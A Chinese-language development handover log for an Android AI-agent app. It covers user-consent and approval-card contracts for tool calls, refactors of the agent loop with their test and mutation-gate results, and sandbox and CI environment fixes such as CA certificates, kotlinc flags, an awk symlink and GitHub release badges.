| 服务被系统杀掉重建后，档位回落到「只读」 | `START_STICKY` 重建时 `intent == null`，`tier` 取默认值。降权方向是安全的（收紧而非放宽），但用户会以为「我明明选了标准档」 | 把 tier 落 SharedPreferences，重建时读回 |
| 重建后端口变了 | `McpHostConfig.port = 0` 由系统分配 | 配好固定端口（需先做「端口被占」的重试与提示） |

这两条都不该现在改：M1 的用途是只读观察，档位与端口变化只影响便利性。
但 M2 做审批卡时必须一起解决——那时用户会真的依赖「标准档 + 弹卡」这条路。

### 3.14 Consent 契约（P1-3 第一版，2026-11-18）

M1 收尾时留下的判断是：**MCP 的审批卡不该单独做**——它会成为第五份审批实现
（主界面一套、桌宠一套、子代理一套、技能一套，再加 MCP 一套）。
查 P1 冻结令，解冻条件第 2 条正是「`Consent` / `ToolSource` / `CapabilitySpec`
三个契约有第一版实现」。所以先做契约，M2 的卡以后者的身份接进来。

**修的是什么**：`ToolApproval?` 里的 `null` 同时表示「这条通道没有弹窗位置」和
「忘了传」。审计 F4 已把运行期改成拒绝，但**表达**层的歧义还在——读者无法从类型上
判断一个 `null` 是设计还是疏忽。

**为什么没选「必填参数」**：全仓 96 处 `RealAgentLoop(` + 11 处 `RegistryToolExecutor(`，
绝大多数是 harness 的「我只想测工具执行」。改成必填得到 107 行噪声，判别力为零。
改成三层：类型（`null` 不可表达、`Deny` 必须带理由）+ 默认值（`Consent.unset`，方向是关）
+ 门禁（A4 盯四个生产入口）。

**顺手把裁决也搬进契约**：原先 try/catch 在 `RegistryToolExecutor` 里，后果是
「取消不是拒绝」只有执行器知道，且执行器牵 `ToolRegistry`（要序列化编译器插件）
→ 行为断言会 SKIP 掉。搬进 `Consent.decide` 后，三个源文件就能真编真跑。

| 入口 | 现在写什么 |
|---|---|
| 主界面 / 子代理 | `Consent.ask { … }` |
| 桌宠 | `Consent.ask { … PetApproval.ask(…) }`（第二阶段，见 §3.15） |
| 技能 | `Consent.ask { … SkillNetGrant.allows(…) }` |

桌宠那一格当时是 `Deny`：价值不在「拒绝」，在于**理由进了工具结果**——用户点开桌宠会话
能看到「该操作需要用户确认，但桌宠气泡上没有审批按钮，已拒绝执行」。但那条理由说的是
「没有按钮」，而按钮是可以做的，所以有了 §3.15。

**验证**：`run-consent-verification.sh`，8 条契约 + 12 条裁决 + 1 条编译前提 = **21 条**。
A6 用行号比较盯「拒绝分支在 `tool.execute` 之前」——B 段测裁决本身，测不到分支顺序。

设计见 [`docs/architecture/Consent-契约-P1-3-2026-11-18.md`](docs/architecture/Consent-契约-P1-3-2026-11-18.md)。

### 3.15 桌宠确认卡（P1-3 第二阶段，2026-11-18 下午）

§3.14 把桌宠写成 `Consent.Deny`，代价是整个工具表被锁在四个只读工具上：
用户说「帮我打开微信」，模型只能回「我这个界面没法确认」。这一节把按钮做出来。

**四件东西**：

| 文件 | 职责 | 为什么单独一层 |
|---|---|---|
| `core/ApprovalGate.kt` | 挂起 / 超时 / 取消，四种 `Outcome` | 只依赖 coroutines，一个文件就能真编真跑 |
| `app/pet/PetApproval.kt` | 进程级状态 + 参数摘要 + 生命周期 | 要 Context / StateFlow，不能进 core |
| `PetPanel.ApprovalCard` | 一张卡：工具名 + 一句参数 + 两个按钮 | 纯渲染，状态由宿主传 |
| `app/pet/ConfirmRequiredTool.kt` | 给任意工具加「必须确认」 | 场景差异留在调用点，不改工具类 |

桌宠工具表因此多了 `app_launch`（`ConfirmRequiredTool(AppLaunchTool(ctx))`）。
选它不选写文件：桌宠的典型句子是「帮我打开微信」，用户说完就去看微信了，
这是悬浮球唯一无可替代的场景。

**三个取舍**：

1. **`cancelAll` 传 `Outcome` 而不是 `false`。** 最初实现用 `complete(false)` 解除等待，
   与「用户点拒绝」共用一个值。harness 的 B8 当天就抓到：界面销毁后等待方拿到 `DENIED`，
   工具结果写「用户拒绝了该操作」——而用户从头到尾没看见那张卡。
2. **没有「本次会话都允许」。** 那需要持久化策略表，现在没有。内存版的「本次允许」会被
   用户当成长期授权，下次点得更快。A8 盯着审批路径不许出现 `SharedPreferences`。
3. **卡片出现时自动展开气泡。** 只订阅不展开，收起态下卡片不在组合里，模型停在 45 秒
   超时，用户眼前只有一个静静待着的悬浮球。

**验证**：`run-pet-consent-verification.sh`，8 条接线 + 17 条网关 + 1 条编译前提 = **26 条**。
A 段盯「卡片真的会被画出来」——组件写好了没人调用是这类改动最常见的失败形态，
而行为 harness 证不了 Compose 渲染。真编在云端服务器做的（`BUILD SUCCESSFUL`，
AGP 8.5 / JDK 21）。

**`HeadlessPolicy` 缓做**：查过 `WorkflowWorker` 只做「到期 → 发通知」，**后台不跑 Agent**
（设计如此）。策略表现在没有任何消费者，做出来是一段没有调用方的抽象。等真有后台执行
入口时再做，那时形状也会更清楚。

### 3.16 会话生命周期簇拆分（2026-11-20 下午）

前两轮把「启动恢复合流」和「LoopDefaults 单一真源」收了。这一轮处理 `ChatViewModel`
里最大的一块散落逻辑：会话生命周期的六个动作（新建 / 切换 / 删除 / 重命名 / 置顶 / 绑目录）。

> 注意与 §21.6 里「会话编辑簇」区分：那里指的是**消息级**编辑
> （`regenerate` / `switchVariant` / `reaskFromTurn` / `deleteFromTurn`，约 136 行），本轮没碰。

**为什么值得拆**：它们共用三条不变量，原先每条都在两个方法里各写一遍——

| 不变量 | 旧写法 | 漏掉的后果 |
|---|---|---|
| 草稿跟着会话走 | `loadConversation` 头尾各一句 | 切回来输入框空了，不报错 |
| 消息下标一变，译文作废 | `loadConversation` + `reloadActiveMessages` 各一句 | 译文显示在别的消息下面 |
| 在途运行只挡「会切走显示」的动作 | 三个方法各自 `if` | 删掉在途会话 → 收尾把消息写回已删 id |

拆成 `app/ui/ConversationEditor.kt`（173 行，**纯 JVM**）后，每条只有一个实现点，
而且能被 harness 真编真跑——这是关键：`ChatViewModel` 拖 Compose，沙箱编不动，
拆之前这三条只有静态 grep 在守。

**顺手抓到并修掉一个真缺陷**：删当前会话时，旧实现先 `drafts.remove(id)`，紧接着
`loadConversation()` 第一行无条件 `drafts.set(旧 id, 输入框内容)`——**把刚清掉的草稿写了回去**。
触发很日常：打了半截话去删这个会话。结果 drafts.json 里留一条以已删 id 为键的草稿，
永远读不出来，还会进备份包。

修法不是加 `if`，而是把「保存上一段草稿」这件事限定在**语义成立的两条路径**上：
`switchTo` / `create`（旧会话还在）。删除与备份恢复走 `adopt`，明确不保存——
那两条路径上旧 id 已经不存在，存下来只能是孤儿数据。

**判据**：`run-conversation-editor-verification.sh`，14 条行为 + 5 条接线 = **19 条**。
C3 直接读 drafts.json 原文断言「里面没有已删会话的键」——`get()` 返回空不足以判定，
键还在但值为空是另一种脏数据。变异 10 条全 CAUGHT（含「把 adopt 换回 switchTo」这条
直接复现旧缺陷）。

**副产物（意外收获）**：`run-hotfix11-verification.sh` 一直因「缺 AGP 产物」SKIP，
但它**全文件只 import `java.io.File`**——本来就是纯源码扫描，AGP classpath 是历史包袱。
改成缺产物时回退 kotlin-stdlib 后，**173 条断言第一次真跑**，当场抓出一条我漏改的断言
（K4 还在查 VM 内部的 `conversationStore.setPinned`）。这条值得记住：**SKIP 不只是
少跑，它会让「改了断言但没人跑」看起来像改对了。**

**数字**：`ChatViewModel` 3253 → **3207**（-46）；新增 `ConversationEditor` 173；
`arch-baseline` 同步收紧到 3207。


### 3.17 RealAgentLoop 第一刀：回合时钟（2026-11-22 晚）

A1 拆分的第一块，也是四块里唯一「只搬声明、不动算式」的：R5 的 `TurnClock`
（回合内时间基准 + 8 个事件的信封拼装）与 `TurnEndStatus`，从 `RealAgentLoop.kt`
搬到 `core/agent/TurnClock.kt`。

**为什么先切它**：它原来是 `private inner class`，对外唯一依赖是
`this@RealAgentLoop.scope`。把这一个依赖提成构造参数，它就是零依赖纯 JVM 类。
另外三块（`ExposurePlanner` / `RequestBuilder` / `ToolBatchExecutor`）都要读
`registry`、`llmProvider()` 这类**可变**状态，切之前得先定「谁持有」，不是一刀的事。

**改了什么**（三处，行为零变化）：

| 位置 | 改法 |
|---|---|
| `TurnClock` | `private inner class TurnClock(turnId)` → 顶层 `internal class TurnClock(turnId, scope, observer)` |
| `TurnEndStatus` | `private class` → 顶层 `internal class`（同一文件） |
| 调用点 | `TurnClock(turnId)` → `TurnClock(turnId, scope, observer)`（全仓仅此一行） |

**判据**（这一刀的重点不是行数）：

- `TurnClockTest.kt`：**6 个用例 / 21 条断言**——信封四要素（turnId / step /
  elapsed / scope）、`step()` 返回值与后续事件同号、`turn.end` 唯一且
  `steps = 末步号 + 1`、`elapsed` 非负不回退、观察者异常不穿透 `emit`、
  `TurnEndStatus` 默认 `completed` 且只被 `set` 改写。
- `mutation-gate.py` 新增 **`trace` 组**（4 个源文件、零 Android，编 300 行不到两秒）
  + M47–M51 五条变异，**全部 CAUGHT**。M47/M48 打的是「steps 少算一步」与
  「turn.end 丢 scope」——这两条一错，时间线就再也答不出「卡在哪个 tool.start」。
- 架构守卫 23 通过 / 0 失败；`RealAgentLoop` 1504 → **1409**，基线同步收紧。

**数字**：变异体 77 → **82**；分组 8 → **9**；`TurnClock.kt` 113 行。

**还没切的三块**（按风险从低到高，行号为 1409 下的新位置）：
`ExposurePlanner`（1177 起）、`RequestBuilder`（1235 起）、`ToolBatchExecutor`
（699 起）。后两块守着一回合最热的路径（工具批次与请求构造），**切完必须真机跑一轮
带工具的对话**——沙箱没有设备，这一条只能留给人。


### 3.18 语音闸门：分支判定搬进纯函数（2026-11-23 凌晨）

修的是**判据的洞**，不是功能的 bug。`run-permission-gate-verification.sh` 里那条
「授予后必须真的开面板」原本长这样：

```bash
grep -A3 'if (granted) {' "$f" | grep -q 'open()'
```

它只认**字面顺序**，不认语义。我把 `open()` 挪进 `else` 分支（授权了反而弹 Toast、
没授权反而开面板），六条 grep **全绿**——这不是推理，是当时在 `/tmp` 里真做的变异。

**改法**：把「走哪条路」抽成 `VoiceInputDecision.next(installed, granted, asked)`
（`VoiceInputDecision.kt`，54 行，**一行 import 都没有**），Composable 只负责把
四条结论落到副作用上，`when` 不写 `else`（枚举漏一支编译就红）。
grep 判据缩回到「接线」：必须调 `VoiceInputDecision.next(`、四个分支都有落点、
`when` 里不许出现 `else ->`。

**判据**：`VoiceInputDecisionTest` 5 个用例 / 9 条断言，穷举 3 个布尔的全部 8 种组合
（第四层「四条出路都可达」防的是判定退化成两三条）。
新增 `ui` 组 + U1–U5，**全部 CAUGHT**（U1 顺序、U2 问过再点、U3 已授权、
U4 首次不弹、U5 未装去开面板）。

**数字**：变异体 82 → **87**；分组 9 → **10**；权限判据 26 → **27** 通过；
`VoiceInputGate.kt` 98 → 122（多出的是一段「为什么判据搬走」的注释与
`openAppSettings` 抽取）。

**一个值得记住的边界**：grep 判据不是没用，它擅长「这个东西还在不在」，
不擅长「它出现在对的位置」。凡是「A 之后必须做 B」的语义，都得有能真跑的东西
（JUnit / harness）兜着，否则 A 挪个位置就成了假绿。


### 3.19 回合配额落地：从「类型钉死、常量生效」到单一来源（2026-11-23 凌晨）

`TaskSpec` / `Quota` 是 P1 最后一块空转：类型层写着「quota 与 consent 无默认值，
任何构造都必须表态」，实际全仓**零处生产构造**，步数上限仍由
`LoopDefaults.MAX_STEPS = 60` 决定。钉住的约束和真正跑的东西不是一回事。

**两个坑，不先填就落不了地**：

1. `Quota.maxSteps` 默认是 **20**，而生产默认是 **60**。如果照文档直接
   `TaskSpec(..., quota = Quota())`，主对话的步数上限会从 60 悄悄降到 20——
   长任务在第 20 步被截断，而且没有任何报错。
2. `Quota.maxSteps = 0` 文档里写的是「不限」，但 loop 里是 `repeat(maxSteps)`：
   0 意味着**一步都不跑**。两者语义相反，中间必须有一层换算。

**改法**：

- `Quota` 搬到 `runtime/Quota.kt`，三项默认**全 0**，语义统一成「这一项没表态」。
  0 是个不可能被误用的值（repeat(0) 立刻暴露），所以任何绕过换算层的代码都会当场炸，
  而不是静默降额。
- `runtime/QuotaResolver.kt`：零 import 的纯函数，`0 → 兜底`，`正数 → 用它`，
  `负数 → 当没设`，兜底值非正时 `require` 直接抛。
  **兜底值从参数传、不写常量**，否则这条链会经 `LoopDefaults` 拖进 `Consent` /
  `AgentTool`，把本可以纯 JVM 验证的东西挤出变异门禁（`RetrySchedule` 踩过同一个坑）。
- `AgentLoopFactory.create` 新增 `quota: Quota = Quota()`，内部只换算一次，
  0 到不了 loop。默认全 0 = 一个都不覆盖，所以主界面不必传（它的配额就是默认值，
  造一个字段全等于默认的 spec 只是噪音）。
- 两个**覆盖型**入口改用 `TaskSpec` 把四项写在一起：桌宠（6 步）、子代理（8 步）。
  `input` 显式传 `""` 并注明「构造期还没有输入，真正的输入在 send」——
  不给默认值，是因为「忘传输入」不该静默变成空字符串。

**判据**：`QuotaResolverTest` 7 个用例，兜底值刻意用 **7 / 1234** 而不是 60 / 30 分钟
（用默认值当兜底，写死常量也测不出来）。新增 `quota` 组 + QT1–QT5，**全部 CAUGHT**。
`run-runtime-invariants` 加两条硬断言：A3 生产代码 TaskSpec 构造 ≥ 2 处、
A4 工厂必须经 `QuotaResolver.resolve(`。

**数字**：变异体 87 → **92**；分组 10 → **11**；运行时不变量 19 → **21** 通过。

**一条没做的，别当成做了**：`Quota.maxTokens` 仍是空字段。loop 里没有按 token
截断的位置，硬造一个计数只会得到一个永不触发的上限——比没有更糟。字段留着是给
「以后要加 token 预算」留落点，类注释里已写明「不要假装它生效」。

### 3.20 系统提示的分段决策搬出 loop（2026-11-23 凌晨）

三段稳定性（FROZEN / SESSION / TURN）此前只写在注释里，**没有任何断言**。这类
错不会报错，只会变慢：记忆段若被标成 FROZEN，每轮记忆一变整段前缀作废，端侧
重新 prefill，用户只感觉「这轮特别慢」，日志里也只有一条前缀变化的 INFO。同理
「没记忆还拼 `memory_usage`」只多花几十 token，谁都不会注意到——直到小模型的
注意力被这条用不上的指令分走。

**改法**：`RealAgentLoop.buildSystemPrompt` 里的分段判断搬到
`core/SystemPromptPlan.kt`（78 行，零 import），只回答「该有哪几段、各归哪一档」；
拼装仍在 `PromptAssembler`。`memoryUsagePrompt` 从参数传而不是引常量——否则这条
链会经 `core/AgentLoop.kt` 拖进编译闭包，把本可以纯 JVM 验证的东西挤出变异门禁
（`RetrySchedule` / `QuotaResolver` 踩过同一个坑）。`buildSystemPrompt` 现在只剩
取数据（`memoryProvider()` + `tools.map { it.systemPrompt }`）和打日志。

**判据**：`SystemPromptPlanTest` 10 个用例，三条是核心：
- **P7 只改记忆，稳定前缀指纹不变**——这是整套分段的唯一目的；
- **P8/P9 改身份或工具提示，指纹必须变**——否则缓存会继续喂旧规则；
- **P5 没有记忆（null / 空串 / 纯空格 / 纯空白）就不拼 `memory_usage`**。

新增 `prompt` 组 + PT1–PT7，**全部 CAUGHT**。其中 PT3（工具段标成 TURN）只红
P2/P9 两条，正好是「改了工具面缓存却不动」的那一对。

**数字**：`RealAgentLoop` 1409 → **1399**（arch 基线下调）；变异体 92 → **99**；
分组 11 → **12**。

**还没做的**：`RequestBuilder` 这块只搬了 `buildSystemPrompt` 的决策。
`logPromptPrefix`（跨回合可变字段 `lastPromptSignature`）与 `buildRequestMessages`
（`ContextBudget` 三连）仍在 loop 里，下一块再动。

### 3.21 请求视图的编排搬出 loop（2026-11-23 凌晨，接 3.20）

`buildRequestMessages` 里有一条只有注释的规则：**先 `pruneImages`，再 `fitToBudget`**。
反过来的后果不是「多丢一条」，是**按错误的体积判据丢**：旧截图剥掉后每张只剩约
20 token，先剥图能让 fit 多留下一整步真实结果；先压历史则把 900 token 的图算进去，
白丢一步。真机表现是「上下文明明没满，它却忘了上一步做了什么」——两处调用各自看
都合理，只有连起来才看得出错。

**改法**：编排搬进 `core/agent/RequestView.kt`（75 行）。`RequestViewBuilder.build`
按固定顺序做两步，返回 `RequestView(messages, dropped, folded)`；`RealAgentLoop`
只剩「按通道算预算」与「打一条日志」。预算值不从外部注入——`budgetForProvider`
需要 providerId 与模型窗口，那是接线职责。

**判据**：`RequestViewTest` 7 用例，三条是核心：
- **V3 先剥图再压历史**——构造「图多字少」的历史（每步 942 token，其中 900 是图），
  预算 1000：正确顺序剥完图剩 192，一条不丢；顺序反了是 2832 对 1000，必丢一步；
- **V1 未超限返回同一实例**——零分配不是优化，是每轮都跑；改成 `toList()` 就是
  每轮多一次 O(n) 拷贝；
- **V4 `anchorIndex` 真透传**——W-49 修过一次，漏传就退回首条 UserMessage，
  多轮会话里用户本轮贴的三张图会被整条剥掉。

新增 `request` 组 + RV1–RV6，**全部 CAUGHT**。RV1（顺序反了）只红 V3 一条，
正好是它该钉的那一条。

**数字**：`RealAgentLoop` 1399 → **1395**（只减 4 行——这块本来没多少可搬的，
价值全在判据）；变异体 99 → **105**；分组 12 → **13**。

**还没做的**：`logPromptPrefix` 仍在 loop 里（日志分类不可测，抽出去只是搬家）；
`ToolBatchExecutor`（237 行）原样未动。

### 3.22 暴露面 → 回合视图的构造搬出 loop（2026-11-23 上午，接 3.21）

`scopedRegistry` 只有 5 行，两种错法都不报错：

- **视图不收紧**（直接 `return registry`）：`RegistryToolExecutor` 靠「`fullRegistry`
  里有它、本回合视图里没有」来区分「模型记错了名字」与「名字对、只是没开组」。
  视图一旦等于全量，后一条分支永远命中不了——被裁工具照常直接执行，裁剪只是没省到
  token，**更糟的是本该先 `__use_tools` 的那次调用被静默放行**，审批层看到的是一次
  正常调用。
- **视图收紧过头**（连元工具一起滤掉）：`__use_tools` 的 description 里塞着全部分组
  清单，几百字符，看起来最该"优化"掉。滤掉之后模型再也开不了组，而它唯一能看到的
  反馈是「未知工具」，于是开始猜工具名——一次开组能解决的往返变成若干次瞎猜。

**改法**：搬进 `core/agent/ToolScope.kt`（48 行）。`ToolScope.viewOf(full, plan)` 只看
`plan.trimmed` 一个字段决定是否收紧，不从 `visible.size` 反推——裁剪与否的真相源只有
`Plan.hiddenCount > 0` 一处。未裁剪时返回**同一实例**，不做等价副本。

**判据**：`ToolScopeTest` 6 用例：
- **S4 被裁工具在视图里查无此工具**——`get` 与 `descriptorOf` 都为 null，全量里仍在；
- **S3 元工具仍在**（死锁守卫）；
- **S6 是否裁剪只看 `plan.trimmed`**——构造 `hiddenCount=0` 但 `visible` 偏少的畸形
  plan，实现必须返回同一实例，自己再算一遍就分叉。

新增 `toolscope` 组 + TS1–TS6，**全部 CAUGHT**。TS5（用 `visible.size` 反推裁剪）
只多红 S6 一条，正好是它该钉的那条。

**数字**：`RealAgentLoop` 1395 → **1388**（只减 7 行——规划本来就在 KernelExposure
里，这里只剩「造视图」）；变异体 105 → **111**；分组 13 → **14**。

**没搬的**：`currentExposure` 一行，读 `registry.list()` + `llmProvider()`，是取数
不是判断；`logExposure` 是日志。`ExposurePlanner` 这个名在原计划里指的是「规划 +
造视图」整体，实际规划早已是 `KernelExposure.plan` 的活并有 harness 判据，所以这一块
只落地了造视图那半边——**计划里 58 行的估算偏乐观，可搬的只有 5 行**。

**还剩**：`ToolBatchExecutor`（237 行，最热路径，**必须先有真机回归**）。


## 4. 代码红线（碰了会立刻红）

| 红线 | 为什么 | 谁在守 |
|---|---|---|
| `:core` 不许 import `ui` / `tools` / Compose / `MainActivity` | 分层边界 | 编译器 + `run-arch-guard-verification.sh` |
| `arch-baseline.txt` **只减不增** | 加一条等于把已知违规合法化 | 同上。当前上限：`ChatViewModel` 3221、`ChatScreen` 3194、`RealAgentLoop` 1388 |
| `harness-baseline.txt` 只增不减（当前 **149**） | 数字变小说明有大面积 SKIP 被当成通过 | `gate.sh` 门禁 5/6 |
| 守卫裁决**不许加 Allow** | 只能拦不能放行，是这套设计唯一的安全性质 | `run-agent-seams-verification.sh` |
| 新 harness 必须「静态断言 + 自编译真跑」两段 | 只 grep 不断言行为 = 假绿 | `gate.sh` |
| 断言要数真实判据，不许为凑数写恒真断言 | `assertion-census` 会统计 | `scripts/qa/lib/` |
| 参考开源项目**只读思路，不抄代码** | 用户明确要求 | 人工评审 |

改完代码如果某个文件行数超了冻结值，**不要直接调大基线**——先问自己能不能不涨。
真必须涨，在 `arch-baseline.txt` 里写清「哪一天、因为什么、涨了多少」。

---

## 5. 环境与工具链（今天刚踩完的两个坑）

### 5.1 没有 Android SDK

本机**不能** `./gradlew assembleDebug`。验证靠两条腿：

- **CI**（GitHub Actions）做真编译；
- **本地**靠 `scripts/qa/` 里的 harness 用 `kotlinc` 自编译被测的纯 Kotlin 文件（不碰 Android 类型）。

这也是为什么新逻辑要尽量放在「零 Android 依赖」的文件里——**能自编译，才能在沙箱里真跑**。

### 5.2 坑一：CA 证书文件整个不存在

症状：`git clone/push` 报 `Failed to connect ... port 443`，`curl https://api.github.com` 返回 `000`，
但 `getent hosts` 正常、`/dev/tcp` 能建连。

根因：`/etc/ssl/certs/ca-certificates.crt` 不存在（不是过期），TLS 握手直接失败。

```bash
mkdir -p /etc/ssl/certs
cp "$(python3 -c 'import certifi;print(certifi.where())')" /etc/ssl/certs/ca-certificates.crt
```

### 5.3 坑二：自建 kotlinc 缺 `-kotlin-home`

症状：harness 的「自编译」段红成 `cannot access built-in declaration 'kotlin.Int'.
Ensure that you have a dependency on the Kotlin standard library`——看起来像代码坏了，
其实是编译器找不到自己的 stdlib。

根因：K2JVMCompiler 靠 `-kotlin-home` 定位 `lib/kotlin-stdlib.jar`；不给它，它会从
`java.class.path` 反推，推不出来，于是**只要显式传了 `-cp` 就丢 stdlib**。

修法（自建 wrapper 的 `exec` 行）：

```sh
exec java -cp "$CP" "$MAIN" -kotlin-home "$BASE" "$@"
```

配套：`$BASE/lib/` 下还要有 `kotlin-compiler.jar` 的运行期依赖（trove4j、annotations），
以及各 runner 按固定文件名找的 `kotlinx-serialization-json-jvm.jar`、
`kotlinx-serialization-core-jvm.jar`、`kotlinx-serialization-compiler-plugin.jar`。
缺插件的症状是 `plugin classpath entry points to a non-existent location: `（冒号后为空）——
看起来像语法错误，其实是 `-Xplugin=""`。

### 5.4 坑三：手工建 `v0.XX` release 会抢走 Latest 徽章（2026-11-22）

症状：README 写「产物在 tag `latest`」，点进去却是 11 天前的 `AgentKit-1.674-debug.apk`。

根因：GitHub 的 **Latest** 徽章按 release 的 `created_at` 挑非 prerelease、非 draft 的那一个，
**不看资产后来有没有被覆盖**。`latest` 这个 release 建于 2026-10-11（建仓当天），
CI 每天往里覆盖 `app-release.apk`；v0.27–v0.34 建于 10-14 之后，于是徽章落在 v0.34。

修法（已做）：把 v0.27–v0.34 共 8 个 release 标成 prerelease，徽章回到 `latest`。
`gh release edit` **不支持按 tag**，要按 release id：

```bash
gh api repos/$REPO/releases --jq '.[] | "\(.id) \(.tag_name)"'   # 取 id
gh api -X PATCH repos/$REPO/releases/<id> -F prerelease=true
gh api repos/$REPO/releases/latest --jq '.tag_name'               # 应输出 latest
```

**不要再手工建 `v0.XX` release**——它会把徽章抢走，而且不会自己回来。
标 prerelease 不删包，老下载链接仍然可用。

还有一处容易配错：**插件必须与编译器同一种打包**。`kotlin-compiler.jar`（非 embeddable）
配非 embeddable 的插件；`kotlin-compiler-embeddable.jar` 配 embeddable 插件。混用会得到
`NoSuchMethodError: KtClassLikeInfo.getScopeAnchor()`，栈里全在序列化插件内部，与业务无关。
最省事的做法是**缓存与 `$KC_HOME` 全部用 embeddable**——那样两处解析到的是同一个 jar，
不存在混配的可能。

### 5.4 坑三：`/usr/bin/awk` 是断链

症状：`r03` / `title-owner` / `runall` 在同一轮里一起红，日志写「ChatScreen 结构变了，
断言失效」「找不到 maybeGenerateTitle 函数体」——看起来像代码被改坏了。

根因：`/usr/bin/awk -> /etc/alternatives/awk`，而目标不存在（`mawk` 装了但 alternatives
没建链）。这些断言用 `awk '/pattern/,/^}/'` 截取代码块，awk 一失败就截出空串。

修法：`ln -sf /usr/bin/mawk /usr/bin/awk`。

### 5.5 推送

- 直连 `github.com:443` 时通时断，**单次 200 不代表大对象能传完**。判据要看三层（解析 / 单请求 / 实际传输），
  细节见 [`docs/ops/沙箱网络与GitHub通道说明.md`](docs/ops/沙箱网络与GitHub通道说明.md)。
- 写权限需要 PAT，**沙箱里不保存凭据**。`git push` 走不通时，可用 GitHub Git Data API 逐个 blob/tree/commit 上传，
  但同样需要 token。
- 注意：用 API 重建提交会让 SHA 变化。**判断「有没有传上去」要比对树对象**
  （`git rev-parse HEAD^{tree}` vs `origin/main^{tree}`），不要看 SHA。

### 5.5.1 坑五：Maven Central 429（2026-11-20 连踩两次）

症状：CI 的 `build` job 红在 **`Unit tests (core: ...)`** 这一步，但日志里没有任何测试失败——
反而是 `Could not resolve org.jetbrains.kotlin:kotlin-reflect:1.9.23 ... 429 Too Many Requests`，
23 秒就 BUILD FAILED。

根因：短时间连推/连 rerun 时，runner 要从 Maven Central 重新解析 gradle 插件 classpath，
被限流。**步骤名会把人骗去查测试**，实际是环境。

判据：日志里搜 `429` 或 `Could not resolve`；若是，等几分钟 rerun，不要改代码。
缓解：一轮把改动攒够再推（这轮 1 小时内推了 4 次，撞了两次）。

**第三次（2026-11-20 下午，第九批）换了个战场**：这回红的是 `mutation-gate` 的
「Kotlin 编译器与运行时库」，`Process completed with exit code 22`，**日志一个字都没有**。
exit 22 是 `curl -f` 拿到 4xx/5xx 时的退出码；`-f` 会把响应体丢掉，`-S` 只对连接错误生效，
所以既看不到 429 也看不到 404。当时只能重跑——重跑即绿，确认是 Maven 限流。

已改（`build.yml` 的 `fetch()`）：失败时打印 `URL（HTTP xxx）`。本地用真 404 验证过输出。
下一代再遇到这条红，先看那行 URL 与码：**429/502 重跑，404 是版本号或路径写错**。

> 教训与 5.5.1 开头那句一脉相承：失败步骤名会骗人，**退出码也会**。
> `exit 22` 看起来像「测试失败」，实际是下载失败；而下载失败的日志被 `-f` 清过场。

### 5.5.2 已定位（2026-11-20）：`ConversationShardRecoveryTest.主索引丢失时按分片重建全部会话`

现象：`core:testDebugUnitTest` 偶发 `AssertionError at ConversationShardRecoveryTest.kt:126`
（4 tests / 1 failed），rerun 即过。共四次：2026-11-19 23:36、11-20 05:10、05:18、08:49。

**不是分片恢复的 bug，是第 126 行那条「删索引备份」的断言太脆。** 具体：

```kotlin
assertTrue("删索引备份", File(root, indexFile().name + AtomicJsonFile.BACKUP_SUFFIX).delete())
```

`.bak` 只在「主文件已存在时的**再一次**写」才产生（见 `AtomicJsonFile.writeLocked`：先
`copyTo(bak)` 再 rename）。而 `ConversationStore.schedulePersist` 有 400ms 去抖，seed 期间的
四次改动（两次 create + 两次 append）大多合并成一次写——**一次写不会留 .bak**。
写几次取决于 flush 与去抖计时器的相对时序，慢机器上反而更容易写两次。

用真实 store 循环 200 次量了一遍：**192 次有 .bak，8 次没有（4%）**。这就是「本地 300 轮
不复现、CI 四次红」的全部解释——不是概率低到看不见，是之前没有用对的复现姿势
（旧复现程序没打在「.bak 存不存在」这个变量上）。

修法：断言的对象从「删除动作的返回值」改成「删完之后 .bak 不存在」。用例要的是
「两份都不可用」（否则 recover 会走 `.bak` 而不是分片扫描），不是「备份一定存在」。
「有 .bak 但内容坏」由 `corruptIndexAndBackup` 那条用例覆盖，两条合起来才是完整分支覆盖。

### 5.6 坑四：沙箱清理后 45 个 runner 集体 SKIP

症状：`run-all.sh` 汇总变成 `PASS=97 SKIP=45`（当时基线是 `PASS=104 SKIP=38`；
现在是 147/0），
一个 FAIL 都没有。看起来「环境干净、一切正常」，实际是**编译型验证整体消失**——
比报红更危险，因为门禁照样绿。

根因：这些 runner 的 `[B] 行为` 段要真编真跑，靠 `scripts/qa/lib/deps.sh` 从
`$QA_GRADLE_CACHE`（默认 `~/.gradle/caches/modules-2/files-2.1`）里找
`kotlin-compiler-embeddable` / `kotlin-stdlib` / `kotlinx-coroutines-core-jvm`。
沙箱重建后这个缓存是空的，`COROUTINES` 解析为空串 → 脚本 `exit 3` 自述 SKIP。
注意 `KOTLINC/STDLIB` 有 `$KC_HOME/lib` 回落，**`COROUTINES` 没有**，所以光设
`KC_HOME=/tmp/kotlinc` 不解决问题。

修法：造一个 maven 布局的假缓存，把 `/tmp/kotlinc/lib` 的 jar 拷进去：

```bash
C=/tmp/qacache
for p in org.jetbrains.kotlin/kotlin-compiler-embeddable:kotlin-compiler-embeddable-1.9.25 \
         org.jetbrains.kotlin/kotlin-stdlib:kotlin-stdlib-1.9.25 \
         org.jetbrains.kotlinx/kotlinx-coroutines-core-jvm:kotlinx-coroutines-core-jvm-1.8.1 \
         org.jetbrains.intellij.deps/trove4j:trove4j-1.0.20200330 \
         org.jetbrains/annotations:annotations-13.0 ; do
  d=${p%%:*}; f=${p##*:}
  mkdir -p "$C/$d"; cp -L "/tmp/kotlinc/lib/${f%%-[0-9]*}.jar" "$C/$d/$f" 2>/dev/null || true
done
# 然后：AGENTKIT_GRADLE_CACHE=/tmp/qacache bash scripts/qa/run-all.sh
```

**必须用 `cp`，不能用 `ln -s`**：`deps.sh` 里是 `find "$dir" -type f`，软链不是 `-type f`，
会被悄悄跳过——症状与「没建缓存」一模一样，白折腾一轮。（这一条是实测踩出来的。）

判据：`PASS` 回到 104 左右，且 `run-voice-arbiter-verification.sh` 的 `[B]` 段
能打出 `B1…B22` 那 22 条，而不是一行 `KS_HARNESS_SKIP`。

### 5.7 坑五：Gradle 缓存里的畸形 `h/` 目录让 84 个 runner 一起红

症状：全量汇总 `PASS=53 SKIP=1 FAIL=94`，日志里一片
`BackendException` / `NoClassDefFoundError: kotlin/reflect/jvm/ReflectJvmMapping`，
或 `module was compiled with an incompatible version of Kotlin (2.2.0, expected 1.9.0)`。

根因：`~/.gradle/caches/modules-2/files-2.1/org.jetbrains.kotlin/kotlin-compiler-embeddable/h/`
里躺着一个 2.2.21 的 jar——**版本目录名是 `h`，不是版本号**。老 harness 用
`find … | head -1` 取编译器，路径更浅的 `h/` 排在 `1.9.25/<hash>/` 前面，于是拿到的
